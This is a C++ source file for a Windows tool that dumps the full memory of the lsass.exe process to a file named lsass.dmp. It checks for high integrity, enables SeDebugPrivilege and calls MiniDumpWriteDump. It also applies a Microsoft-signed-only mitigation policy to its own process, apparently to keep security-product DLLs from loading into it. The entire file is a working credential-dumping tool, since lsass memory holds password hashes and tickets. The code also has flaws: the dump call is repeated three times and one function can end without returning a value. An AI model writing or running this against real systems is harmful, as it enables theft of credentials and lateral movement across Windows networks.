#include "pch.h"
#include <iostream>
#include <Windows.h>
#include <assert.h>
#include <sddl.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <Dbghelp.h>
#include <Processthreadsapi.h>

#define MAX_NAME 256
#define FILE_NAME "lsass.dmp"
#define _WIN32_WINNT 0x0602

void setProcessSignaturePolicy()
{
	bool result;

	//https://docs.microsoft.com/en-us/windows/desktop/api/winnt/ns-winnt-process_mitigation_binary_signature_policy
	PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY policy = { 0 };
	policy.MicrosoftSignedOnly = 1;

	try {
		result = SetProcessMitigationPolicy(ProcessSignaturePolicy, &policy, sizeof(policy));
	}
	catch (const std::exception& e)
	{
		std::cout << " a standard exception was caught, with message '" << e.what() << "'\n";
	}
	DWORD errorCode = GetLastError();
	if (!result)
	{
		std::cout << L"[!] An error occured. Unable to set process signature policy! Error code is: " << errorCode << std::endl;
	}
	else
	{
		std::cout << "\n[>] Process signature policy was set successfully." << std::endl;
	}
}

bool IsHighIntegrity()
{
	wchar_t HighIntegrity[] = L"S-1-16-12288";
	HANDLE hToken;

	// https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-openprocesstoken
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
	{
		std::cout << "Failed to get access token" << std::endl;
		return FALSE;
	}

	DWORD dwSize = 0;
	if (!GetTokenInformation(hToken, TokenGroups, NULL, 0, &dwSize)
		&& GetLastError() != ERROR_INSUFFICIENT_BUFFER)
	{
		std::cout << "Failed to query the byte size of TokenGroups" << std::endl;
		CloseHandle(hToken);
		return FALSE;
	}

	// allocate memory for pTokenGroups
	PTOKEN_GROUPS pTokenGroups = (PTOKEN_GROUPS)GlobalAlloc(GPTR, dwSize);


	// https://docs.microsoft.com/en-us/windows/desktop/api/securitybaseapi/nf-securitybaseapi-gettokeninformation
	if (!GetTokenInformation(hToken, TokenGroups, pTokenGroups, dwSize, &dwSize))
	{
		std::cout << "Failed to retrieve TokenGroups" << std::endl;
		GlobalFree(pTokenGroups);
		CloseHandle(hToken);
		return FALSE;
	}

	for (DWORD i = 0; i < pTokenGroups->GroupCount; ++i)
	{

		wchar_t* pStringSid = NULL;

		// https://docs.microsoft.com/en-us/windows/desktop/api/sddl/nf-sddl-convertsidtostringsida
		if (!ConvertSidToStringSid(pTokenGroups->Groups[i].Sid, &pStringSid))
		{
			std::cout << "Failed to convert to string SID" << std::endl;
			continue;
		}
		else
		{
			//check if Sid is the high integrity Sid S-1-16-12288
			if (!wcscmp(pStringSid, HighIntegrity))
			{
				return TRUE;
			}
			else
			{
				continue;
			}
			LocalFree(pStringSid);
		}
	}

	GlobalFree(pTokenGroups);
	CloseHandle(hToken);

	return FALSE;
}

DWORD GetPID()
{
	HANDLE processes;
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);
	wchar_t lsass[] = L"lsass.exe";

	processes = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (!Process32First(processes, &entry))
	{
		std::cout << "Error\n" << std::endl;
		CloseHandle(processes);          // clean the snapshot object
	}
	while (Process32Next(processes, &entry))
	{
		if (!wcscmp(entry.szExeFile, lsass))
		{
			return entry.th32ProcessID;
			break;
		}
	}
}

BOOL SetPrivilege(
	LPCWSTR lpszPrivilege,  // name of privilege to enable/disable
	BOOL bEnablePrivilege   // to enable or disable privilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;
	HANDLE hToken = NULL;

	//https://stackoverflow.com/questions/17987589/adjusttokenprivileges-error-6-handle-invalid
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		if (hToken)
		{
			CloseHandle(hToken);
			return false;
		}
	}

	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		lpszPrivilege,   // privilege to lookup 
		&luid))        // receives LUID of privilege
	{
		printf("LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("[!] AdjustTokenPrivileges error: %u. Exiting...\n", GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

	{
		printf("[!] The token does not have the specified privilege. \n");
		return FALSE;
	}

	return TRUE;
}

void Minidump(DWORD lsassPID)
{
	HANDLE lsassHandle;
	bool Dump;
	HANDLE DumpFile;

	DumpFile = CreateFileA(FILE_NAME, GENERIC_ALL, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (DumpFile == INVALID_HANDLE_VALUE)
	{
		DWORD errorCode = GetLastError();
		std::cout << L"[!] Can't create the file! Error code is: " << errorCode << std::endl;
	}

	lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsassPID);
	if (lsassHandle)
	{
		try
		{
			Dump = MiniDumpWriteDump(lsassHandle, lsassPID, DumpFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
		}
		catch (const std::exception& e)
		{
			//std::cout << " a standard exception was caught, with message '"	<< e.what() << "'\n";
			DWORD errorCode = GetLastError();
			std::cout << L"[!] An error occured. Unable to dump lsass! Error code is: " << errorCode << std::endl;
		}
		Dump = MiniDumpWriteDump(lsassHandle, lsassPID, DumpFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
		if (MiniDumpWriteDump(lsassHandle, lsassPID, DumpFile, MiniDumpWithFullMemory, NULL, NULL, NULL))
		{
			std::cout << "[+] Successfully dumped lsass. Check for lsass.dmp file." << std::endl;
		}
		else
		{
			DWORD errorCode = GetLastError();
			std::cout << L"[!] An error occured. Unable to dump lsass! Error code is: " << errorCode << std::endl;
		}
	}
	else
	{
		std::cout << "[!] Can't open a handle to lsass" << std::endl;
	}

	//CloseHandle(lsassHandle);
	CloseHandle(DumpFile);
}

int main()
{
	//set process signature policy
	setProcessSignaturePolicy();

	//check for high integrity context
	if (IsHighIntegrity())
	{
		std::cout << "[>] Current process is running under high integrity context." << std::endl;
	}
	else
	{
		std::cout << "[!] No in high integrity context, exiting...\n" << std::endl;
		return 0;
	}

	//retrieve lsass PID
	DWORD lsassPID;
	lsassPID = GetPID();
	std::cout << "[>] lsass.exe process ID found: " << lsassPID << std::endl;

	//enable SeDebugPrivilege
	if (SetPrivilege(L"SeDebugPrivilege", TRUE))
	{
		std::cout << "[>] SeDebugPrivilege enabled." << std::endl;
	}

	//check if SetProcessMitigationPolicy successfully worked by using GetSignatureMitigation project --> https://github.com/SekoiaLab/BinaryInjectionMitigation/tree/master/GetSignatureMitigation
	system("pause");

	//dump lsass
	std::cout << "[>] Trying to dump lsass..." << std::endl;
	Minidump(lsassPID);
}